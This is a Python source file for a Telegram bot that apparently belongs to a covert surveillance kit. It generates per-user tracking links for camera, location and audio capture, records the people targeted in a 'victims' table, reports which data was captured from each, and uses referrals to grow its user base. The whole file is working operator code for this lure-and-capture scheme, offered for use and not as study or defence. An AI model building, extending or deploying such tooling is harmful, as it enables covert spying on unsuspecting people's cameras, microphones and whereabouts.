import telebot, random, string, time, traceback
from datetime import datetime
from config import BOT_TOKEN, CHANNEL_USERNAME, BASE_URL
from database import db, REQUIRED_REFS, FREE_LINKS

bot = telebot.TeleBot(BOT_TOKEN, threaded=False)

def gen_code(n=8):
    return ''.join(random.choices(string.ascii_lowercase+string.digits, k=n))

def check_ch(uid):
    try:
        m = bot.get_chat_member(CHANNEL_USERNAME, uid)
        return m.status in ('member','administrator','creator')
    except: return False

def mk_kb():
    kb = telebot.types.InlineKeyboardMarkup(row_width=2)
    kb.add(
        telebot.types.InlineKeyboardButton("New Link", callback_data="a"),
        telebot.types.InlineKeyboardButton("My Links", callback_data="b"),
        telebot.types.InlineKeyboardButton("Profile", callback_data="c"),
        telebot.types.InlineKeyboardButton("Referral", callback_data="d"),
        telebot.types.InlineKeyboardButton("Stats", callback_data="e"),
    )
    if CHANNEL_USERNAME:
        kb.add(telebot.types.InlineKeyboardButton("Channel", url=f"https://t.me/{CHANNEL_USERNAME[1:]}"))
    return kb

def bk():
    kb = telebot.types.InlineKeyboardMarkup()
    kb.add(telebot.types.InlineKeyboardButton("Menu", callback_data="m"))
    return kb

@bot.message_handler(commands=['start'])
def start(m):
    uid = m.from_user.id
    un = m.from_user.username or 'User'
    fn = m.from_user.first_name or ''
    user = db.get_user(uid)
    new = False
    if not user:
        db.create_user(uid, un, fn)
        user = db.get_user(uid)
        new = True
    args = m.text.split()
    if len(args) > 1 and new:
        try:
            rid = int(args[1])
            if rid != uid and user and not user['referred_by']:
                if db.add_referral(rid, uid):
                    try: bot.send_message(rid, f"New referral!\n{fn} joined!\nTotal: {db.get_user(rid)['refer_count']}")
                    except: pass
        except: pass
    if new: txt = f"Welcome {fn}!\nFree: {FREE_LINKS}\nEvery {REQUIRED_REFS} refs = +1 link"
    else: txt = f"Back {fn}!"
    try: bot.send_message(uid, txt, reply_markup=mk_kb())
    except: pass

@bot.callback_query_handler(func=lambda c: True)
def cb(c):
    uid = c.from_user.id
    d = c.data
    try:
        if not c.message or not c.message.message_id:
            bot.answer_callback_query(c.id)
            return
        mid = c.message.message_id
        
        if d == 'm':
            try: bot.edit_message_text("Menu", uid, mid, reply_markup=mk_kb())
            except: pass
            bot.answer_callback_query(c.id)
            
        elif d == 'c':
            u = db.get_user(uid)
            if not u:
                try: bot.edit_message_text('Use /start first', uid, mid, reply_markup=bk())
                except: pass
            else:
                ch = 'Yes' if check_ch(uid) else 'No'
                av = db.get_available_links(uid)
                vs = db.get_user_victims(uid)
                dc = sum(1 for v in vs if v and (v['camera_data'] or v['location_data'] or v['audio_data']))
                txt = f"Profile\nUID: {uid}\nName: {u['first_name'] or u['username']}\nJoined: {u['join_date'][:10]}\nChannel: {ch}\nRefs: {u['refer_count']}\nTotal Links: {u['total_links_created']}\nAvailable: {av}\nData Collected: {dc}"
                try: bot.edit_message_text(txt, uid, mid, reply_markup=bk())
                except: pass
            bot.answer_callback_query(c.id)
            
        elif d == 'a':
            if not check_ch(uid):
                try: bot.edit_message_text(f'Join {CHANNEL_USERNAME} first!', uid, mid, reply_markup=bk())
                except: pass
                bot.answer_callback_query(c.id)
                return
            if db.is_rate_limited(uid):
                try: bot.edit_message_text('Rate limit! Max 5/hour', uid, mid, reply_markup=bk())
                except: pass
                bot.answer_callback_query(c.id)
                return
            av = db.get_available_links(uid)
            if av <= 0:
                u = db.get_user(uid)
                rc = u['refer_count'] if u else 0
                need = REQUIRED_REFS - (rc % REQUIRED_REFS)
                if need == REQUIRED_REFS: need = 0
                try: bot.edit_message_text(f'No links left! Need {max(1,need)} more referral(s)', uid, mid, reply_markup=mk_kb())
                except: pass
                bot.answer_callback_query(c.id)
                return
            code = gen_code()
            cu = f'{BASE_URL}/camera/{code}'
            lu = f'{BASE_URL}/location/{code}'
            au = f'{BASE_URL}/audio/{code}'
            if not db.create_victim(uid, code, cu, lu, au):
                try: bot.edit_message_text('Failed to create', uid, mid, reply_markup=bk())
                except: pass
                bot.answer_callback_query(c.id)
                return
            txt = f"New link created!\nCode: {code}\nAvailable: {av-1}\n\nCamera: {cu}\nLocation: {lu}\nAudio: {au}"
            nk = telebot.types.InlineKeyboardMarkup()
            nk.add(telebot.types.InlineKeyboardButton('My Links', callback_data='b'))
            nk.add(telebot.types.InlineKeyboardButton('Menu', callback_data='m'))
            try: bot.edit_message_text(txt, uid, mid, reply_markup=nk)
            except: pass
            bot.answer_callback_query(c.id, "Created!")
            
        elif d == 'b':
            pp = 5
            vs = db.get_user_victims(uid, pp, 0)
            db.c.execute("SELECT COUNT(*) FROM victims WHERE telegram_id=?", (uid,))
            total = db.c.fetchone()[0]
            tp = max(1, (total + pp - 1) // pp)
            if total == 0:
                try: bot.edit_message_text('No links yet.\nCreate one with "New Link" button!', uid, mid, reply_markup=mk_kb())
                except: pass
                bot.answer_callback_query(c.id)
                return
            txt = f'Links (page 1/{tp})\n\n'
            for v in vs:
                if not v: continue
                ic = []
                if v.get('camera_data'): ic.append('[CAM]')
                if v.get('location_data'): ic.append('[LOC]')
                if v.get('audio_data'): ic.append('[AUD]')
                st = ' '.join(ic) if ic else '[waiting]'
                txt += f'{v.get("victim_code","?")} {v.get("created_at","?")[:10]} {st} hits:{v.get("access_count",0)}\n\n'
            nk = telebot.types.InlineKeyboardMarkup()
            if tp > 1:
                nk.add(telebot.types.InlineKeyboardButton('Next', callback_data='p1'))
            nk.add(telebot.types.InlineKeyboardButton('Menu', callback_data='m'))
            try: bot.edit_message_text(txt, uid, mid, reply_markup=nk)
            except: pass
            bot.answer_callback_query(c.id)
            
        elif d == 'd':
            bu = bot.get_me().username
            link = f'https://t.me/{bu}?start={uid}'
            u = db.get_user(uid)
            rc = u['refer_count'] if u else 0
            av = rc // REQUIRED_REFS
            need = REQUIRED_REFS - (rc % REQUIRED_REFS)
            if need == REQUIRED_REFS: need = 0
            txt = f"Referral\n{link}\nRefs: {rc}\nExtra: {av}\nFree: {FREE_LINKS}\nNext: {need}"
            try: bot.edit_message_text(txt, uid, mid, reply_markup=bk())
            except: pass
            bot.answer_callback_query(c.id)
            
        elif d == 'e':
            s = db.get_stats()
            txt = f"Stats\nUsers: {s['users']}\nVictims: {s['victims']}\nCamera: {s['camera']}\nLocation: {s['location']}\nAudio: {s['audio']}"
            try: bot.edit_message_text(txt, uid, mid, reply_markup=bk())
            except: pass
            bot.answer_callback_query(c.id)
            
        elif d.startswith('p'):
            try:
                page = int(d[1:])
                pp = 5; off = page * pp
                vs = db.get_user_victims(uid, pp, off)
                db.c.execute("SELECT COUNT(*) FROM victims WHERE telegram_id=?", (uid,))
                total = db.c.fetchone()[0]
                tp = max(1, (total + pp - 1) // pp)
                txt = f'Links (page {page+1}/{tp})\n\n'
                for v in vs:
                    if not v: continue
                    ic = []
                    if v.get('camera_data'): ic.append('[CAM]')
                    if v.get('location_data'): ic.append('[LOC]')
                    if v.get('audio_data'): ic.append('[AUD]')
                    st = ' '.join(ic) if ic else '[waiting]'
                    txt += f'{v.get("victim_code","?")} {v.get("created_at","?")[:10]} {st} hits:{v.get("access_count",0)}\n\n'
                nk = telebot.types.InlineKeyboardMarkup()
                nav = []
                if page > 0: nav.append(telebot.types.InlineKeyboardButton('Prev', callback_data=f'p{page-1}'))
                if page < tp-1: nav.append(telebot.types.InlineKeyboardButton('Next', callback_data=f'p{page+1}'))
                if nav: nk.row(*nav)
                nk.add(telebot.types.InlineKeyboardButton('Menu', callback_data='m'))
                try: bot.edit_message_text(txt, uid, mid, reply_markup=nk)
                except: pass
            except: pass
            bot.answer_callback_query(c.id)
            
        else:
            bot.answer_callback_query(c.id)
            
    except Exception as e:
        print(f"Button error: {e}", flush=True)
        try: bot.answer_callback_query(c.id, "Error", show_alert=False)
        except: pass

def run():
    print('Bot polling started...', flush=True)
    while True:
        try:
            bot.infinity_polling(timeout=60, long_polling_timeout=60, skip_pending=True)
        except Exception as e:
            print(f'Polling error: {e}', flush=True)
            time.sleep(3)
